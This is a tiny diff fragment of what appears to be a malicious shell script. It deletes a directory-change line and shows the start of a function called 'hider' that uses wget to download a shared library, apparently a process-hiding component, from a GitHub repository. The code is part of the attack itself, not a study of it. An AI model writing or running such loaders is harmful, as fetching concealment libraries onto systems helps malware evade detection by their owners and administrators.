@@ -1,4 +1,3 @@
-cd /usr/local/games/ ;
 
 function hider {
     wget https://raw.githubusercontent.com/m4rtis01/zarwel/main/libprhid.so ;
